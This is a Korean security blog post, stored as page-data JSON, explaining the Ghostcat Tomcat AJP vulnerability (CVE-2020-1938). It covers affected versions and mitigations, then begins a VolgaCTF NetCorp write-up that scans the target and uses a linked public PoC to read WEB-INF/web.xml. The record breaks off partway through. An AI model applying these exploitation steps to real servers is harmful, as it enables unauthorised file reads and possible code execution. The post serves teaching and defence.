{"componentChunkName":"component---src-templates-blog-post-js","path":"/Security/Ghostcatcve-2020-1938-CNVD-2020-10487-취약점-이란-톰캣-AJP-취약점-Feat-VolgaCTF-2020-Qualifier-NetCorp/","result":{"data":{"site":{"siteMetadata":{"author":"JaeSeoKim","comment":{"utterances":"JaeSeoKim/jaeseokim.github.io"},"sponsor":{"buyMeACoffeeId":"jaeseokim"}}},"markdownRemark":{"excerpt":"Ghostcat logo created by 차이틴 테크(Chaitin Tech) 취약점 개요 Apache Tomcat에서 기본으로 제공하던 AJP(Apache JServ Protocol) Connector에 취약점이 발견하게 되어 이를 통해 인증없이 Tomcat서버의 webapp목록 하위에 있는 모든 파일을 읽을 수 있습니다. 또한 파일 업로드가 가능한…","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 100%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAABJ0AAASdAHeZh94AAACUElEQVQ4y71UT4gSYRQfiDY9ZDaNpm5Ql9gIL3kRNvKQoBGuUNQp6tDNU5fyIigRbAnCQpJtCAqCB0/G1kUtxBCpQx60U1mw2O5m7hhtf/w788sZm3Fmmu0PLD14zPe9973f93vz3vsI7LAQ/wWQZVnxq7b+I6BaoLBnGIZXqV15XgYodY5GI9W1AMzth8Mhr9x+W0AhQJkyJ/l8HvRmWzU9aYwsZY4NJ7VaDV6vFy6XC9lslrf5/X5Qs4fgPOuBw+HA8oNl3I1GkcvlVEFlKXs8HqTTaZTLZQSDQd7mPX8BZoKAbYYAQUy1UqlASkYEFG5otVpwu90y56vXDZwgNXg5vxe1U3p4D2pA7JuB0UKh8aahzlAwdDodWK1WNJtN0bl07z4sYzbPT+rxYl6H07pd2H/xKLSHtSjlixOGg4Gs4rKU7XY7bDYbCoUCwuEwtBoNn96R3QSO75mmq9OTWF3fmDBUFJIQWoGTeDwuBlEUBYPBALPJhAPmWehNFhybmwNlNOLSwhmg+xnD9jpGa2/Bdr9PGSrbxOl0giRJlEolnmm1WsWz8frpkwLu3F5E5uEK3gUuY7B0DVv+c/h68wqY9tpPQObXPqRpGoFAAJlMBslkEqlUColEArFYDI8freD9x02wqUVs3bqKL9cX8C16A2y/q85QWrF6vY5IJAKfz4dQKIRisSj6Rp/aYDZWwXBf+oO8KMpZFmZXOjWyOVeZDllRlEZBuYbt9/vo9Xq8DsbtwZ+RAHP/bKIKhtvd9rf2376Has/Yv7yLO/5i/wDi0Y3EycS/pQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"img\"\n        title=\"img\"\n        src=\"/static/2142701cde2d67952438b7f5a364eed3/5a190/ghostcat.png\"\n        srcset=\"/static/2142701cde2d67952438b7f5a364eed3/772e8/ghostcat.png 200w,\n/static/2142701cde2d67952438b7f5a364eed3/e17e5/ghostcat.png 400w,\n/static/2142701cde2d67952438b7f5a364eed3/5a190/ghostcat.png 800w,\n/static/2142701cde2d67952438b7f5a364eed3/c1b63/ghostcat.png 1200w,\n/static/2142701cde2d67952438b7f5a364eed3/29007/ghostcat.png 1600w,\n/static/2142701cde2d67952438b7f5a364eed3/460fa/ghostcat.png 1910w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p><em>Ghostcat logo created by 차이틴 테크(Chaitin Tech)</em></p>\n<blockquote>\n<h1 id=\"취약점-개요\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%9C%EC%9A%94\" aria-label=\"취약점 개요 permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 개요</h1>\n<p>Apache Tomcat에서 기본으로 제공하던 AJP(Apache JServ Protocol) Connector에 취약점이 발견하게 되어 이를 통해 인증없이 Tomcat서버의 <strong>webapp목록 하위에 있는 모든 파일을 읽을 수 있습니다.</strong></p>\n<p>또한 파일 업로드가 가능한 서버라면 <strong>RCE(Remote Code Execution)</strong> 공격으로도 이어질 수 있습니다.</p>\n<p>이 취약점이 가능해진 이유는 기본적으로 AJP Connector가 활성화 되는 것이 기본으로 설정되어 있고 또한 모든 IP 주소에 대해 허가를 하고 있어 심각도가 높습니다.</p>\n</blockquote>\n<h3 id=\"취약한-버전-목록\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%ED%95%9C-%EB%B2%84%EC%A0%84-%EB%AA%A9%EB%A1%9D\" aria-label=\"취약한 버전 목록 permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약한 버전 목록</h3>\n<table>\n<thead>\n<tr>\n<th>Apache Tomcat 버전</th>\n<th>취약한 버전</th>\n<th>수정된 버전</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Apache Tomcat 9</td>\n<td>9.0.30 and below</td>\n<td>9.0.31</td>\n</tr>\n<tr>\n<td>Apache Tomcat 8</td>\n<td>8.5.50 and below</td>\n<td>8.5.51</td>\n</tr>\n<tr>\n<td>Apache Tomcat 7</td>\n<td>7.0.99 and below</td>\n<td>7.0.100</td>\n</tr>\n<tr>\n<td>Apache Tomcat 6</td>\n<td>ALL</td>\n<td>지원 종료되어 <strong>패치 없음</strong>.</td>\n</tr>\n</tbody>\n</table>\n<p>이 취약점은 대부분의 Tomcat 버전에 대해 취약점을 가지고 있고 그 심각도도 높아 주의를 기울어야 합니다.</p>\n<h3 id=\"대응-방법\" style=\"position:relative;\"><a href=\"#%EB%8C%80%EC%9D%91-%EB%B0%A9%EB%B2%95\" aria-label=\"대응 방법 permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>대응 방법</h3>\n<ol>\n<li>\n<p><strong>최신 버전의 Tomcat으로 업데이트</strong></p>\n<p>최신 버전의 Tomcat은 기본적으로 AJP를 비활성화 시켜두었고 또한 추가적인 검증 절차를 통하기 때문에 최신 버전의 Tomcat으로 업데이트를 권장 합니다.</p>\n</li>\n<li>\n<p><strong>AJP Connector를 사용 하지 않을 경우 AJP 비활성화</strong></p>\n<p><code>conf/server.xml</code> 파일에서 AJP Connector 설정 부분을 주석 처리 하여 비활성화 합니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"xml\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\">&lt;!-- &lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; &gt; --&gt;</span></span></span></code></pre>\n</li>\n<li>\n<p><strong>AJP Connector를 사용하는 경우 requiredSecret 옵션을 추가하여 인증이 된 연결만 허가</strong></p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"xml\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&lt;</span><span class=\"mtk4\">Connector</span><span class=\"mtk1\"> </span><span class=\"mtk7\">port</span><span class=\"mtk1\">=</span><span class=\"mtk6\">&quot;8009&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">protocol</span><span class=\"mtk1\">=</span><span class=\"mtk6\">&quot;AJP/1.3&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">redirectPort</span><span class=\"mtk1\">=</span><span class=\"mtk6\">&quot;8443&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">address</span><span class=\"mtk1\">=</span><span class=\"mtk6\">&quot;허용하는 IP&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk7\">requiredSecret</span><span class=\"mtk1\">=</span><span class=\"mtk6\">&quot;Secret&quot;</span><span class=\"mtk1\"> &gt;</span></span></span></code></pre>\n</li>\n</ol>\n<h3 id=\"poc-코드\" style=\"position:relative;\"><a href=\"#poc-%EC%BD%94%EB%93%9C\" aria-label=\"poc 코드 permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC 코드</h3>\n<p><a href=\"https://github.com/w4fz5uck5/CVE-2020-1938-Clean-Version\">https://github.com/w4fz5uck5/CVE-2020-1938-Clean-Version</a></p>\n<blockquote>\n<p><em>POC 코드는 테스트 용도로만 사용이 되어야 합니다. 실제 서비스 중인 서버에 사용을 하는 것은 분명한 공격행위 입니다. 모든 행동에 대한 책임은 본인에게 있다는 것을 주의 하시길 바랍니다.</em></p>\n</blockquote>\n<p>이제 이러한 취약점이 어떻게 공격으로까지 이루어 질 수 있는지 <strong>VolgaCTF 2020 Qualifier</strong>의 <code>NetCorp</code> 문제를 가지고 설명 하겠습니다.</p>\n<h1 id=\"volgactf-2020-qualifier---netcorp-writeup\" style=\"position:relative;\"><a href=\"#volgactf-2020-qualifier---netcorp-writeup\" aria-label=\"volgactf 2020 qualifier   netcorp writeup permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>VolgaCTF 2020 Qualifier - NetCorp WriteUp</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsSAAALEgHS3X78AAACo0lEQVQoz1XSWUiUURjG8a+aPheSEjPIJaJGQzSF1DItKxLFHMMLRTGHzEnU3MIWU8massnKZTRrFh11cs3UL7VIITEMNLC8aFVvgkqii+yiq0j99zUa2MXD8x4O/HjhHAHTWhYb1rF4z50FywbmjWuZN9nJ/S/i8lnkt0G09a86kS/FjsyVO7BQ78iifI/ZztaCDTSvgxZfaN4MFgU0rpEjd7MIVnt5FpfmVgdok9Noz9wlF35Xb4BOZzApllFRBu8IzD+J4OdkMm8HE3nYcpbeziv0t12g15RDjymTwe5CJFM+LbpUWspT6ag8iVSXzgN9Gl238/nRHiqjgryYvQzWCcwNx/P6dSRT74IYeHGUymcXUPd2EGvt58DFiwTl5RBWoiUs6zohSaXsiMjGM1SDe3AKXtFFfLDGQb28mOkvaBCYlWJotQQyMqBk9q0fPz/78H56PxVjFWQND1E29pJr468wzHyka+or5r5xbhklwpOyCYjJZaY5xgYu/AM/SSparUF0NG3l1WgAY0/9aazyoELvQ1iBhoKebh5++4X+zSyl0iSX2ieokiaIO6PDNyqb6WbVCrBBYLg6inMlfjwf9Gaoz5eUBDfiD28hQx3Jnoh9eIcHklh2A8PYNIOjUzyWRrjc0E3w0Qx8DmcyY10JWgSGKlW4KpXU3PTEot+OJnk3mpx0MtXHOZWXwcFoFQonJzz8d7FPlUje6SJyz5fitTeWHYdOMN0UvQI0C4yakxE2ByGIArlZ68lP20ZaagJhcceJiFfjrAxgtYsXClcvVrkqEVy92RRwhI07Y3ALSeW95cj/j/K5+xi1ei26QjXXzqdQX6Ghx1jMo3ot9xvKqC0/Q82NIu7WXMUgx6i/irlGh6FKi9lQy/cueUPj0rf5A7YZ7zg1Rk9pAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image-20200330163001467\"\n        title=\"image-20200330163001467\"\n        src=\"/static/9143fd2d8e9b2d094c839e62c45c68e2/5a190/image-20200330163001467.png\"\n        srcset=\"/static/9143fd2d8e9b2d094c839e62c45c68e2/772e8/image-20200330163001467.png 200w,\n/static/9143fd2d8e9b2d094c839e62c45c68e2/e17e5/image-20200330163001467.png 400w,\n/static/9143fd2d8e9b2d094c839e62c45c68e2/5a190/image-20200330163001467.png 800w,\n/static/9143fd2d8e9b2d094c839e62c45c68e2/c1b63/image-20200330163001467.png 1200w,\n/static/9143fd2d8e9b2d094c839e62c45c68e2/29007/image-20200330163001467.png 1600w,\n/static/9143fd2d8e9b2d094c839e62c45c68e2/09262/image-20200330163001467.png 1896w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>공격 대상의 웹 서버입니다. 공격 서버의 정보 수집을 위해 <code>DirBurster</code> 을 사용하여 정보를 수집합니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsSAAALEgHS3X78AAABBUlEQVQY052PW2uDQBCF9///lEKJNprV0tIXH4RiCzGp1431sroWiURQH0/XJQ3UvvXhY2bOOcwwJGUpoihCHMcKxhiyLIMQAqJpVG3bVqE00VxZ6wKNzJM4jrDf+/A8D67rwvd9JEmCNE3l8pM8kuBwOOL4Eag+SZk6uhAEgfLCMLzmGcj72yus3R00bQPDMLDdbmHbNqj1CNN6hiG510xsHigM+gTTfsGO2jJjqbyu6zBNE5RSOI4Dcu57fAmGz+yEYRgwTxMmSd+f0XUd5nlW88I4jrKO6s3LZVjpk8qTsixR1w2qiksqcM7/RV3XyPMcZFmyDGs4r2/Bvx7/5f30RVHgG6AvroozlZ25AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image-20200330163609968\"\n        title=\"image-20200330163609968\"\n        src=\"/static/32cb0e8aca95aeec5f6bc15247f42edd/5a190/image-20200330163609968.png\"\n        srcset=\"/static/32cb0e8aca95aeec5f6bc15247f42edd/772e8/image-20200330163609968.png 200w,\n/static/32cb0e8aca95aeec5f6bc15247f42edd/e17e5/image-20200330163609968.png 400w,\n/static/32cb0e8aca95aeec5f6bc15247f42edd/5a190/image-20200330163609968.png 800w,\n/static/32cb0e8aca95aeec5f6bc15247f42edd/f79fa/image-20200330163609968.png 940w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>접근이 가능한 경로에 <code>/docs</code> , <code>/examples</code> 라는 경로가 보입니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsSAAALEgHS3X78AAABl0lEQVQoz32RS2/TQBSF/QPZItYs+DfsWSAhdQcSC1YICVTUQklCiYjSR2zH49ixZ2zHiT0Px3bVosP1VKqoijrSp3PmdTRzryOlxtl8ipOv73A2+4HGaJQbgTznyERqVfA18iyl9QwFzeuqhFYVlNw9wBkdfcD7V8/w6eAp0vAUw1ixCxx++Yjx6Bi/pyPMZxNMxt/wc3yM8/kvdPsKuNnjz3XzAOf1y+f4/OYJDt++QJkFuOl3kNsISXSOgnvIEhd56lkv4ktSH1f7Ap3J/ouTRhcwsgBnJ4i973Q4h1Eb9K2il9R3tE1lte8U+fre3r9Q4BytinDdFkSOvhFUO4F4nSBJUqxWEQIWgosMnuej2Gzx2HBiNkMpXKhtiE6tbWC1K8EChjBcIY4iSFlTwSXpLcYYaG2s3np9p86GL6h2LuGh1Ql6w2lDIqOuCp7YTg+XNXVf65ouSupwbb1SA8oGDdpQqBP6UwSLCWTJcNVwdENo39NXGwRLTS/dYen7CIKIfI2QSfheZf0ykGAsprkLd3Fpf/MX0YVPQ4ZBY7EAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image-20200330163658559\"\n        title=\"image-20200330163658559\"\n        src=\"/static/74e60b465f89419ebfc84e76e9558ae3/5a190/image-20200330163658559.png\"\n        srcset=\"/static/74e60b465f89419ebfc84e76e9558ae3/772e8/image-20200330163658559.png 200w,\n/static/74e60b465f89419ebfc84e76e9558ae3/e17e5/image-20200330163658559.png 400w,\n/static/74e60b465f89419ebfc84e76e9558ae3/5a190/image-20200330163658559.png 800w,\n/static/74e60b465f89419ebfc84e76e9558ae3/d2a60/image-20200330163658559.png 807w\"\n        sizes=\"(max-width: 800px) 100vw, 800px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>접근을 해보면 Tomcat의 기본 안내 문서와 예제가 그대로 노출 되어 있습니다. 또한 여기서 버전 정보가 노출이 되는데 이 버전은 위에서 설명한 <code>Ghoscat (cve-2020-1938, CNVD-2020-10487)</code> 취약점 대상입니다.</p>\n<p><code>Nmap</code> 이용하여 실제로 AJP PORT 8009가 열려 있는지 확인 합니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 719px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsSAAALEgHS3X78AAABJ0lEQVQoz42SaU7DMBCFfZOSxFaduFmapVm8JW6LhLj/eR62gaICovz45Jmx580ik9djh3WaMakV3aQxmTOkvUCuzzDnF0zaYVRbjK2bw9k5WGvh/KmUQtM0OJ1OaNs22mRYFJR/oI32FwOU9r6S/rJG1x7RdW2MH72f5zmEECiKItqB3W53I0kSkGWZMY4jur6PlZRUWBbpkwTKskRdN6iqKiaHhECapjebMXYHCRUPhwO01ijyApvd0Hc9sjRDlr1DKY18T/4NEroKokFwGAYYbVCKEpzzHyKfwn9Bwrg851EwYI2NY4dCe76/E6WMPoTMfod920NOEoILWGXR+L1xxsES9kX6P4hdfUezgpMOQzXgaq64+C9S8hL0iUYxmn3skLKHvAFpSvQTxGqx4QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image-20200330163931972\"\n        title=\"image-20200330163931972\"\n        src=\"/static/b2ecc09c677e4c576f6a497f0bd215ad/073e9/image-20200330163931972.png\"\n        srcset=\"/static/b2ecc09c677e4c576f6a497f0bd215ad/772e8/image-20200330163931972.png 200w,\n/static/b2ecc09c677e4c576f6a497f0bd215ad/e17e5/image-20200330163931972.png 400w,\n/static/b2ecc09c677e4c576f6a497f0bd215ad/073e9/image-20200330163931972.png 719w\"\n        sizes=\"(max-width: 719px) 100vw, 719px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>실제로 <code>8009</code> 포트가 열려 있는 것을 확인 했습니다.</p>\n<p>POC 코드를 이용하여 정상적인 방법으로는 읽을 수 없는 <code>WEB-INF/web.xml</code> 에 대해 요청 해봅니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"xml\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&lt;!</span><span class=\"mtk10\">DOCTYPE</span><span class=\"mtk1\"> </span><span class=\"mtk11\">web-app</span><span class=\"mtk1\"> PUBLIC</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&lt;</span><span class=\"mtk4\">web-app</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  &lt;</span><span class=\"mtk4\">display-name</span><span class=\"mtk1\">&gt;NetCorp&lt;/</span><span class=\"mtk4\">display-name</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  &lt;</span><span class=\"mtk4\">servlet</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  \t&lt;</span><span class=\"mtk4\">servlet-name</span><span class=\"mtk1\">&gt;ServeScreenshot&lt;/</span><span class=\"mtk4\">servlet-name</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  \t&lt;</span><span class=\"mtk4\">display-name</span><span class=\"mtk1\">&gt;ServeScreenshot&lt;/</span><span class=\"mtk4\">display-name</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  \t&lt;</span><span class=\"mtk4\">servlet-class</span><span class=\"mtk1\">&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/</span><span class=\"mtk4\">servlet-class</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  &lt;/</span><span class=\"mtk4\">servlet</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  &lt;</span><span class=\"mtk4\">servlet-mapping</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  \t&lt;</span><span class=\"mtk4\">servlet-name</span><span class=\"mtk1\">&gt;ServeScreenshot&lt;/</span><span class=\"mtk4\">servlet-name</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  \t&lt;</span><span class=\"mtk4\">url-pattern</span><span class=\"mtk1\">&gt;/ServeScreenshot&lt;/</span><span class=\"mtk4\">url-pattern</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  &lt;/</span><span class=\"mtk4\">servlet-mapping</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t&lt;</span><span class=\"mtk4\">servlet</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t&lt;</span><span class=\"mtk4\">servlet-name</span><span class=\"mtk1\">&gt;ServeComplaint&lt;/</span><span class=\"mtk4\">servlet-name</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t&lt;</span><span class=\"mtk4\">display-name</span><span class=\"mtk1\">&gt;ServeComplaint&lt;/</span><span class=\"mtk4\">display-name</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t&lt;</span><span class=\"mtk4\">description</span><span class=\"mtk1\">&gt;Complaint info&lt;/</span><span class=\"mtk4\">description</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t&lt;</span><span class=\"mtk4\">servlet-class</span><span class=\"mtk1\">&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/</span><span class=\"mtk4\">servlet-class</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t&lt;/</span><span class=\"mtk4\">servlet</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t&lt;</span><span class=\"mtk4\">servlet-mapping</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t&lt;</span><span class=\"mtk4\">servlet-name</span><span class=\"mtk1\">&gt;ServeComplaint&lt;/</span><span class=\"mtk4\">servlet-name</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t&lt;</span><span class=\"mtk4\">url-pattern</span><span class=\"mtk1\">&gt;/ServeComplaint&lt;/</span><span class=\"mtk4\">url-pattern</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t&lt;/</span><span class=\"mtk4\">servlet-mapping</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t&lt;</span><span class=\"mtk4\">error-page</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span 